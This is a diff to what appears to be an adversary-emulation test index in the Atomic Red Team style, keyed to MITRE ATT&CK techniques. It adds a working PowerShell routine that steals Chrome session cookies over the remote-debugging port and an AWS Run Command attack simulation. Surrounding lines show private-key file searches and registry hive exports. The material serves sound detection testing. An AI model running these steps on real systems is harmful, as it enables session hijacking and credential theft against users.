@@ -9611,6 +9611,40 @@ go mod init chocolate
 go mod tidy
 go build
 ",
+T1539,Steal Web Session Cookie,Steal Chrome v127+ cookies via Remote Debugging (Windows),b647f4ee-88de-40ac-9419-f17fac9489a7,"Chrome v127+ uses app-bound encryption to protect cookies. This test bypasses that protection to obtain the cookies. If successful, the test outputs cookie values to the console.
+Note: Will stop any instances of Chrome already running
+Adapted from https://embracethered.com/blog/posts/2024/cookie-theft-in-2024-and-what-todo",windows,,,"$devToolsPort = 9222
+$testUrl = ""https://www.google.com""
+stop-process -name ""chrome"" -force -erroraction silentlycontinue
+$chromeProcess = Start-Process ""chrome.exe"" ""$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default"" -PassThru
+Start-Sleep 10
+$jsonResponse = Invoke-WebRequest ""http://localhost:$devToolsPort/json"" -UseBasicParsing
+$devToolsPages = ConvertFrom-Json $jsonResponse.Content
+$ws_url = $devToolsPages[0].webSocketDebuggerUrl
+$ws = New-Object System.Net.WebSockets.ClientWebSocket
+$uri = New-Object System.Uri($ws_url)
+$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
+$GET_ALL_COOKIES_REQUEST = '{""id"": 1, ""method"": ""Network.getAllCookies""}'
+$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
+$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
+$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
+$completeMessage = New-Object System.Text.StringBuilder
+do {
+    $receivedBuffer = New-Object byte[] 2048
+    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
+    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
+    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
+    $completeMessage.Append($receivedString)
+} while (-not $result.EndOfMessage)
+$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, ""Closing"", [System.Threading.CancellationToken]::None).Wait()
+try {
+    $response = ConvertFrom-Json $completeMessage.ToString()
+    $cookies = $response.result.cookies
+} catch {
+    Write-Host ""Error parsing JSON data.""
+}
+Write-Host $cookies
+Stop-Process $chromeProcess -Force",powershell,False,,,,,
 T1552.004,Unsecured Credentials: Private Keys,Private Keys,520ce462-7ca7-441e-b5a5-f8347f632696,"Find private keys on the Windows file system.
 File extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc
 ",windows,,,"dir c:\ /b /s .key | findstr /e .key
@@ -21190,6 +21224,61 @@ reg export HKLM\security %temp%\security
 del %temp%\system >nul 2> nul
 del %temp%\security >nul 2> nul
 ",,,
+T1651,Cloud Administration Command,AWS Run Command (and Control),a3cc9c95-c160-4b86-af6f-84fba87bfd30,"This test simulates an adversary using the AWS Run Command service to execute commands on EC2 instances.
+",iaas:aws,,,"Import-Module ""PathToAtomicsFolder/T1651/src/T1651-1/AWSSSMAttack.ps1"" -Force
+$access_key = ""#{access_key}""
+$secret_key = ""#{secret_key}""
+$session_token = ""#{session_token}""
+$aws_profile = ""#{profile}""
+$region = ""#{region}""
+Set-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region
+Invoke-Terraform -TerraformCommand init -TerraformDirectory ""PathToAtomicsFolder/T1651/src/T1651-1""
+Invoke-Terraform -TerraformCommand apply -TerraformDirectory ""PathToAtomicsFolder/T1651/src/T1651-1"" -TerraformVariables @(""profile=T1651-1"", ""region=$region"")
+Invoke-SSMAttack -AWSProfile ""T1651-1"" -TerraformDirectory ""PathToAtomicsFolder/T1651/src/T1651-1""
+Invoke-Terraform -TerraformCommand destroy -TerraformDirectory ""PathToAtomicsFolder/T1651/src/T1651-1"" -TerraformVariables @(""profile=T1651-1"", ""region=$region"")
+",powershell,,,,powershell,"dependencies.0.description: The AWS PowerShell module must be installed.
+
+dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AWSPowerShell -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+
+dependencies.0.get_prereq_command: Install-Module -Name AWSPowerShell -Force
+
+dependencies.1.description: Terraform must be installed.
+
+dependencies.1.prereq_command: terraform --version
+
+dependencies.1.get_prereq_command: Write-Host ""Terraform is required. Download it from https://www.terraform.io/downloads.html""
+
+","input_arguments.access_key.description: AWS Access Key
+
+input_arguments.access_key.type: string
+
+input_arguments.access_key.default: 
+
+input_arguments.secret_key.description: AWS Secret Key
+
+input_arguments.secret_key.type: string
+
+input_arguments.secret_key.default: 
+
+input_arguments.session_token.description: AWS Session Token
+
+input_arguments.session_token.type: string
+
+input_arguments.session_token.default: 
+
+input_arguments.profile.description: AWS profile
+
+input_arguments.profile.type: string
+
+input_arguments.profile.default: 
+
+input_arguments.region.description: AWS region to deploy the EC2 instance
+
+input_arguments.region.type: string
+
+input_arguments.region.default: us-east-2
+
+"
 T1105,Ingress Tool Transfer,rsync remote file copy (push),0fc6e977-cb12-44f6-b263-2824ba917409,"Utilize rsync to perform a remote file copy (push)
 ",linux,macos,,"rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
 ",sh,True,,,sh,"dependencies.0.description: rsync must be installed on the machine 
